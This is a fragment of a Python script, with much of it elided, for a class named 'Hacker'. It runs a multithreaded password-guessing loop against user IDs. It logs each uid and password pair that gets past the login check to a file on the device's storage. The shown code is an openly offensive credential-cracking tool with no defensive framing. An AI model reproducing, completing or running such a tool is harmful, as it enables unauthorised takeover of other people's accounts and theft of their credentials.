...
class Hacker:
    ...
    def settings(self):
       self.clear();print("⋙ Example : 5000 10000 99999");self.linex()
       ...
       with tred(max_workers=50) as kidz:
    ...
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r⋙ [𝐕𝐀𝐈𝐋𝐄𝐍𝐂𝐄] ⋙ %s ⋙ OK ⋙ %s "%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              ...
              if "Please Confirm Email" in str(po):
                 print(f"\r\r⋙ [VS_OLD-OK😻] ⋙\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/Hacker-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
